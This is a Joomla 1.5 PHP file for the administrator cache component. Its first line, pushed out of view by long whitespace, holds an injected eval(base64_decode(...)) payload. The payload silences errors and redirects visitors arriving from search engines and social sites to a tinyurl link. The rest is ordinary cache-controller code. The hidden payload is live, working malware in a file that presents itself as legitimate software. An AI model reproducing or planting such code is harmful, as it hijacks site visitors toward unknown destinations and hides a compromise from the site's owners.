<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: admin.cache.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Cache
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/*
 * Make sure the user is authorized to view this page
 */
$user =& JFactory::getUser();
if (!$user->authorize( 'com_cache', 'manage' )) {
	$mainframe->redirect( 'index.php', JText::_('ALERTNOTAUTH') );
}

// Load the html output class and the model class
require_once (JApplicationHelper::getPath('admin_html'));
require_once (JApplicationHelper::getPath('class'));

$cid = JRequest::getVar( 'cid', array(0), 'post', 'array' );

/*
 * This is our main control structure for the component
 *
 * Each view is determined by the $task variable
 */
switch ( JRequest::getVar( 'task' ) )
{
	case 'delete':
		CacheController::deleteCache($cid);
		CacheController::showCache();
		break;
	case 'purgeadmin':
		CacheController::showPurgeCache();
		break;
	case 'purge':
		CacheController::purgeCache();
		break;
	default :
		CacheController::showCache();
		break;
}

/**
 * Static class to hold controller functions for the Cache component
 *
 * @static
 * @package		Joomla
 * @subpackage	Weblinks
 * @since		1.5
 */
class CacheController
{
	/**
	 * Show the cache
	 *
	 * @since	1.5
	 */
	function showCache()
	{
		global $mainframe, $option;
		$submenu = JRequest::getVar('client', '0', '', 'int');
		$client	 =& JApplicationHelper::getClientInfo($submenu);
		if ($submenu == 1) {
			JSubMenuHelper::addEntry(JText::_('Site'), 'index.php?option=com_cache&client=0');
			JSubMenuHelper::addEntry(JText::_('Administrator'), 'index.php?option=com_cache&client=1', true);
		} else {
			JSubMenuHelper::addEntry(JText::_('Site'), 'index.php?option=com_cache&client=0', true);
			JSubMenuHelper::addEntry(JText::_('Administrator'), 'index.php?option=com_cache&client=1');
		}

		$limit		= $mainframe->getUserStateFromRequest( 'global.list.limit', 'limit', $mainframe->getCfg('list_limit'));
		$limitstart = $mainframe->getUserStateFromRequest( $option.'.limitstart', 'limitstart', 0 );

		$cmData = new CacheData($client->path.DS.'cache');

		jimport('joomla.html.pagination');
		$pageNav = new JPagination( $cmData->getGroupCount(), $limitstart, $limit );

		CacheView::displayCache( $cmData->getRows( $limitstart, $limit ), $client, $pageNav );
	}

	function deleteCache($cid)
	{
		// Check for request forgeries
		JRequest::checkToken() or jexit( 'Invalid Token' );

		$client	=& JApplicationHelper::getClientInfo(JRequest::getVar('client', '0', '', 'int'));

		$cmData = new CacheData($client->path.DS.'cache');
		$cmData->cleanCacheList( $cid );
	}
	function showPurgeCache()
	{	
		// Check for request forgeries
		CacheView::showPurgeExecute();
	}
	function purgeCache()
	{	
		// Check for request forgeries
		JRequest::checkToken() or jexit( 'Invalid Token' );
		$cache =& JFactory::getCache('');
		$cache->gc();
		CacheView::purgeSuccess();
	}
}
